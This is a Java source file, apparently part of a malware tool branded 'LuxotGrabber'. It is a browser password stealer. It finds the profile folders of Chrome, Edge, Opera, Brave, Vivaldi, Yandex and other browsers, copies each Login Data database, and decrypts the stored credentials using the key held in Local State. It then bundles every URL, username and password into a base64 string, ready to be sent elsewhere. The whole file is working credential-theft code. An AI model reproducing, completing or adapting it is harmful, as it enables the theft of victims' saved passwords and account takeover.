package io.github.luxotick.impl;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import io.github.luxotick.utils.DecryptUtil;
import io.github.luxotick.utils.DriverUtil;
import io.github.luxotick.utils.KeyUtil;

import java.io.File;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;

public class Passwords {
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final HashMap<String, String> paths = new HashMap<String, String>() {
        {
            String A = "\\Google\\Chrome\\User Data";
            String B = "\\Microsoft\\Edge\\User Data";
            String C = "\\Chromium\\User Data";
            String D = "\\Opera Software\\Opera Stable";
            String E = "\\Opera Software\\Opera GX Stable";
            String F = "\\BraveSoftware\\Brave-Browser\\User Data";
            String G = "\\Vivaldi\\User Data";
            String H = "\\Yandex\\YandexBrowser\\User Data";
            put("Google Chrome", localAppData + A);
            put("Microsoft Edge", localAppData + B);
            put("Chromium", localAppData + C);
            put("Opera", appData + D);
            put("Opera GX", appData + E);
            put("Brave", localAppData + F);
            put("Vivaldi", localAppData + G);
            put("Yandex", localAppData + H);
        }
    };
    private final JsonArray pswds = new JsonArray();
    public String grabPassword() {
        stealUserData();
        String pswdStr = "";
        for (JsonElement pswd : pswds)
        {
            pswdStr += "\n=========<LuxotGrabber>==========\nURL: " + pswd.getAsJsonObject().get("url").getAsString() + "\nUSER: " + pswd.getAsJsonObject().get("username").getAsString() + "\nPASS: " + pswd.getAsJsonObject().get("password").getAsString() + "\n=========<LuxotGrabber>==========\n";
        }
        System.out.println(pswdStr);
        return Base64.getEncoder().encodeToString(pswdStr.getBytes());
    }
    private void stealUserData() {
        for (String browser : paths.keySet()) {
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = KeyUtil.getKey(new File(userData, "Local State"));
            for (File data: userData.listFiles()) {
                if (data.getName().contains("Profile") || data.getName().equals("Default")) {
                    lickPasswords(data, key);
                } else if (data.getName().equals("Login Data")) {
                    lickPasswords(userData, key);
                }
            }
        }
    }

    private void lickPasswords(File profile, byte[] key) {
        try {
            File loginData = new File(profile, "Login Data");
            File tempLoginData = new File(profile, "Temp Login Data");
            if (!loginData.exists()) return;
            Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.sql.Driver driver = DriverUtil.getDriver();
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");
            while (resultSet.next()) {
                byte[] encryptedPassword = resultSet.getBytes(3);
                String decryptedPassword = DecryptUtil.decrypt(encryptedPassword, key);
                if (decryptedPassword != null || (resultSet.getString(1) != null && resultSet.getString(2) != null)) {
                    JsonObject pswd = new JsonObject();
                    pswd.addProperty("url", (!resultSet.getString(1).equals("")) ? resultSet.getString(1) : "N/A");
                    pswd.addProperty("username", (!resultSet.getString(2).equals("")) ? resultSet.getString(2) : "N/A");
                    pswd.addProperty("password", decryptedPassword);
                    pswds.add(pswd);
                }
            }
        } catch (Exception e) {
        }
    }
}